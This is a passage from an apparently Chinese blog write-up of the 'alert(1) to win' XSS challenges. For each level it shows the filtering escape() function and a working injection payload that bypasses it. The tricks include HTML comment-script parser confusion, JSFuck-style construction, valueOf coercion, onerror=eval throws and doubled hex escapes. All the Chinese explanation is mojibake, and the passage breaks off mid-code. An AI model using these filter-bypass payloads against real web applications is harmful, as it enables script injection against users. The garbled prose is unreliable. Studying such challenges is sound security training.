·çš„ï¼Œä¸è¿‡æœ‰ä¸ªå‰ææ—¶iframeå¹¶æ²¡æœ‰è®¾ç½®nameå±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†iframeçš„window.nameï¼ŒåŒæ—¶ä¹Ÿä¼šå°†iframeçš„nameå±æ€§å€¼è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼ˆå‰ææ˜¯å®ƒä¸å­˜åœ¨çš„è¯ï¼Œä¸èƒ½è¢«è¦†ç›–ï¼‰</li></ol><p>æ‰€ä»¥ï¼Œç­”æ¡ˆå‡ºæ¥äº†ã€‚<br>solution(13)ï¼š <code>name=&#39;youWon&#39;</code><br><br><br><br><br></p><h1 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">html</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> s.replace(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">'&amp;#'</span> + s.charCodeAt(<span class="number">0</span>) + <span class="string">';'</span>; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="string">'&lt;script&gt;'</span> +</span><br><span class="line">      <span class="string">'var url = '</span> + json(s) + <span class="string">'; // We\'ll use this later '</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;\n\n'</span> +</span><br><span class="line">    <span class="string">'  &lt;!-- for debugging --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  URL: '</span> + html(s) + <span class="string">'\n\n'</span> +</span><br><span class="line">    <span class="string">'&lt;!-- then suddenly --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n'</span> +</span><br><span class="line">    <span class="string">'  else new Image().src = url;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;'</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ç”±åˆšåˆšé‚£ä¸ªåšä¸»æä¾›çš„ã€‚åŸç†æˆ‘æš‚æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨HTML5ä¸­å¦‚æœé‡åˆ°<code>&lt;!--&lt;script&gt;</code>ï¼Œå°±ä¼šè®¤ä¸ºæ¥ä¸‹çš„ä»£ç æ˜¯JSä»£ç ï¼Œç›´åˆ°é‡åˆ°ç»“æŸçš„<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»å¾—ä¿è¯æœ‰ç›¸åº”çš„<code>-&gt;</code>ï¼Œå¦åˆ™ä¼šè®¤ä¸ºè¯­æ³•å‡ºé”™çš„ã€‚<br>å…·ä½“çš„å†…å®¹å¯ä»¥åˆ°åˆšåˆšé‚£ä¸ªåšä¸»é‡Œçœ‹å§ï¼Œæˆ‘å°±ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ã€‚<br>solution(25): <code>if(alert(1)/*&lt;!--&lt;script&gt;</code><br><br><br><br><br></p><h1 id="JSON-â…¢"><a href="#JSON-â…¢" class="headerlink" title="JSON â…¢"></a>JSON â…¢</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></span><br><span class="line">      <span class="comment">// bytes by only escaping those.</span></span><br><span class="line">      <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;).join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•å°±å¯ä»¥åšå‡ºæ¥äº†ã€‚<br>solution(29): <code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code><br>åˆ†æä¸€ä¸‹è¿™ä¸ªç­”æ¡ˆã€‚<br>è¾“å…¥è¿™ä¸ªç­”æ¡ˆï¼Œä¼šè¾“å…¥å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æ³¨å…¥äº†<code>&lt;!--&lt;script&gt;</code>ï¼Œå¯¼è‡´parserå°†è¿™ä¸€æ®µéƒ½å½“ä½œJSæ¥å¤„ç†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")</span></span><br></pre></td></tr></table></figure><p>jså¼•æ“ä¼šè§£ææˆå¦‚ä¸‹çš„æ ·å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;junk_string&quot;) &lt; /junk_regexp/ ; alert(1) // --&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<br>junk_stringä»£è¡¨ï¼š <code>&lt;!--&lt;script&gt;</code><br>junk_regexpä»£è¡¨ï¼š <code>script&gt;&lt;script&gt;console.log(&quot;&quot;)</code><br>æˆ‘ä»¬çš„solutionä¸­æ³¨å…¥çš„å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦<code>)/</code>å°±ä¸ºäº†æ¬ºéª—JSå¼•æ“ï¼ŒJSå¼•æ“ä¼šå°†ä¸¤ä¸ªæ–œæ ä¹‹é—´çš„å†…å®¹å½“ä½œæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œç”¨è¿™ä¸ªåŠæ³•æ¥é—­åˆæ‰è¿™äº›å¤šä½™çš„å­—ç¬¦ã€‚<br><br><br><br><br></p><h1 id="Skandia-â…¢"><a href="#Skandia-â…¢" class="headerlink" title="Skandia â…¢"></a>Skandia â…¢</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜<code>Skandia ][</code>å·®ä¸å¤šçš„åšæ³•ã€‚ä¸è¿‡å› ä¸ºè¿‡æ»¤å¤šäº†ä¸€ä¸ªåæ–œæ†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿äº†ã€‚é‚£å°±è¦æ¢ä¸€ç§æ€è·¯ã€‚<br>å…ˆæ¥çœ‹çœ‹ä¸‹é¢çš„è¡¨æ ¼ã€‚<br><img src="/image/1.png" alt><br>è¿™é‡Œçš„è¡¨æ ¼æ˜¯è¯´ï¼Œå·¦è¾¹çš„è¾“å…¥æ˜¯å¯ä»¥è¿”å›å³è¾¹çš„å­—ç¬¦ä¸²çš„ã€‚å¤§å®¶å¯ä»¥åœ¨è¯•è¯•ã€‚<br>æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•æ¥è·å–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²<br><img src="/image/2.png" alt><br>æ‰€ä»¥æœ€åçš„payload(246):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"+[][(''+!1)[3]+(''+&#123;&#125;)[1]+(''+!0)[1]+(''+!0)[0]][(''+&#123;&#125;)[5]+(''+&#123;&#125;)[1]+(''+&#123;&#125;[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+&#123;&#125;)[5]+(''+!0)[0]+(''+&#123;&#125;)[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"</span>(<span class="number">1</span>)<span class="string">")())//`</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯éƒ½èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æ›´çŸ­ä¸€äº›</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="string">''</span>+!<span class="number">1</span>+!<span class="number">0</span>+&#123;&#125;[<span class="number">0</span>]+&#123;&#125;  <span class="comment">//_="falsetrueundefined[object Object]"</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥payloadå¯ä»¥ç¼©çŸ­æˆ144ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");_=''+!1+!0+&#123;&#125;[0]+&#123;&#125;;[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(i++) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></span><br><span class="line"><span class="comment">// (which compiles and executes a string) if all the characters not</span></span><br><span class="line"><span class="comment">// enclosed in strings are in the set of characters that form JSON</span></span><br><span class="line"><span class="comment">// tokens."</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="regexp">/[^,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</span><br><span class="line">          text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">      <span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">''</span> + val);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ®è¯´è¿™é¢˜æ˜¯åŸºäºçœŸå®çš„æ¡ˆä¾‹ï¼Œ<a href="https://twitter.com/WisecWisec" target="_blank" rel="noopener">Stefano Di Paola</a>è®°è½½åœ¨è¿™ç¯‡<a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html" target="_blank" rel="noopener">æ–‡ç« </a>ä¸­ã€‚<br>ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæ˜¯å…è®¸æˆ‘ä»¬è¾“å…¥<code>self</code>çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨å…¨å±€å‡½æ•°<code>the_easy_but_expensive_way_out</code>äº†ã€‚<br>è¿™é¢˜çš„æŠ€å·§å°±æ˜¯è®©ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå€¼æˆ–è€…ä¸€ä¸ªå­—ç¬¦ç›¸åŠ ã€‚è¿™æ ·JSå¼•æ“å°±ä¼šå»è®¡ç®—æˆ‘ä»¬çš„å¯¹è±¡çš„å€¼ï¼Œæ€ä¹ˆè®¡ç®—å‘¢ï¼Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>valueOf</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å°†valueOfæ–¹æ³•å®šä¹‰ä¸ºé¢˜ç›®ä¸­çš„<code>the_easy_but_expenssive_way_out</code>ï¼Œï¼Œå°±å¯ä»¥è§¦å‘alertå‡½æ•°äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯alert(i++)ï¼Œiä»0å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨ä¸¤æ¬¡ã€‚<br>solution(103): <code>{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}+0,{&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]}</code><br>éœ€è¦æé†’çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”±<code>eval</code>è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”±<code>console.log</code>è°ƒç”¨ã€‚<br><br><br><br><br></p><h1 id="Brunn"><a href="#Brunn" class="headerlink" title="Brunn"></a>Brunn</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  http:<span class="comment">//www.avlidienbrunn.se/xsschallenge/</span></span><br><span class="line"></span><br><span class="line">  s = s.replace(<span class="regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt; var email = '"</span> + s + <span class="string">"'; &lt;\/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†å·å°–æ‹¬å·éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æ™®é€šçš„åŠæ³•æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ä¸Šä¸€é¢˜çš„æ–¹æ³•è¿˜æ˜¯æœ‰ç”¨ã€‚<br>æ‰€ä»¥åº”è¯¥æ„é€ çš„payloadæ˜¯ï¼š<br><code>&#39;+{valueOf:Function(&#39;alert(1)&#39;)}//</code><br>æˆ–è€…<code>&#39;+{valueOf:function(){alert(1)}}//</code><br>æˆ–è€…<code>&#39;+{valueOf:()=&gt;{alert(1)}}//</code><br>æˆ–è€…<code>&#39;+{valueOf:a=&gt;{alert(1)}}//</code><br>ä½†æ˜¯æœ‰æ–°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸èƒ½ä½¿ç”¨å°æ‹¬å·å’Œä¸­æ‹¬å·ã€‚<br>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals" target="_blank" rel="noopener">Tag Function</a>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<br>solution(85):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+&#123;valueOf:Function`a$&#123;'</span>alert<span class="string">'+String.fromCharCode`40`+1+String.fromCharCode`41`&#125;`&#125;//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="No"><a href="#No" class="headerlink" title="No"></a>No</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/[()`&lt;]/g</span>, <span class="string">''</span>); <span class="comment">// no function calls</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">           <span class="string">'var string = "'</span> + s + <span class="string">'";\n'</span> +</span><br><span class="line">           <span class="string">'console.log(string);\n'</span> +</span><br><span class="line">           <span class="string">'&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒèµ„æ–™ï¼š<a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/" target="_blank" rel="noopener">XSS technique without parentheses</a><br>solution(39): <code>&quot;;onerror=eval;throw&#39;=alert\x281\x29&#39;//</code><br><br><br><br><br></p><h1 id="Kâ€™Zâ€™K"><a href="#Kâ€™Zâ€™K" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜è¦ç”¨çš„åŠæ³•è¿˜æ˜¯å’Œé¢˜ç›®ä¸€æ ·Skandia ][]ï¼Œä½†æ˜¯ä¸ç”¨å…¨éƒ¨éƒ½ç”¨å…«è¿›åˆ¶æ¥æ›¿æ¢ï¼Œåªè¦æ›¿æ¢æ‰å…ƒéŸ³å­—æ¯å°±å¯ä»¥äº†ã€‚<br>solution(60):  <code>&quot;,[][&quot;p\x6fp&quot;][&quot;c\x6fnstr\x75ct\x6fr&quot;](&#39;\x61l\x65rt(1)&#39;)(),&quot;</code></p><p><br><br><br><br></p><h1 id="Kâ€™Zâ€™K-1"><a href="#Kâ€™Zâ€™K-1" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels and escape sequences in honor of K'Z'K </span></span><br><span class="line">    <span class="comment">// y is only sometimes a vowel, so it's only removed as a literal</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æœ‰ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œå°†æˆ‘ä»¬çš„å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶éƒ½ç»™æ›¿æ¢æˆç©ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šä¸€é¢˜çš„åšæ³•å’Œé¢˜ç›®JSON ][çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚<br>solution(85): <code>&quot;);[][&quot;p\x\x6f6fp&quot;][&quot;c\x\x6f6fnstr\x\x7575ct\x\x6f6fr&quot;](&#39;\x\x6161l\x\x6565rt(1)&#39;)()//</code></p><p><br><br><br><br></p><h1 id="Kâ€™Zâ€™K-2"><a href="#Kâ€™Zâ€™K-2" class="headerlink" title="Kâ€™Zâ€™K"></a>Kâ€™Zâ€™K</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Stephen Leppik</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// remove vowels in honor of K'Z'K the Destroyer</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[aeiouy]/gi</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// remove certain characters that can be used to get vowels</span></span><br><span class="line">    s = s.replace(<span class="regexp">/[&#123;&#125;!=&lt;&gt;\\]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¤æ‚ä¸€ç‚¹ï¼Œæ²¡æƒ³åˆ°å¥½åŠæ³•ã€‚æ‰€ä»¥è¿˜æ˜¯ç”¨è€åŠæ³•ã€‚<br>solution(190): </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//</span></span><br></pre></td></tr></table></figure><p><br><br><br><br></p><h1 id="Fruit-1"><a href="#Fruit-1" class="headerlink" title="Fruit 1"></a>Fruit 1</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'SCRIPT'</span> === n.tagName) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®çš„æ¼æ´æ¥æºäºä»£ç çš„é€»è¾‘ä¸ä¸¥è°¨ã€‚<br>å…³é”®åœ¨äºç¬¬6è¡Œä¸­çš„<code>i&lt;n.attributes.length</code>ï¼Œä½†æ˜¯è¿™ä¸ªlengthæ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œå¯¼è‡´å¦‚æœæœ‰å¤šä¸ªå±æ€§çš„æ—¶å€™ï¼Œå°±è¿˜å‰©ä¸‹ä¸€ä¸ªå±æ€§æ˜¯åˆ ä¸æ‰äº†ã€‚<br>è¿™æ ·çš„è¯æˆ‘ä»¬å°±æ„é€ å¤šä¸ªå±æ€§å¥½äº†ï¼Œå°†<code>onload=alert(1)</code>æ”¾åé¢ã€‚<br>solution(26): <code>&lt;iframe t onload=alert(1)&gt;</code></p><p><br><br><br><br></p><h1 id="Fruit-2"><a href="#Fruit-2" class="headerlink" title="Fruit 2"></a>Fruit 2</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span 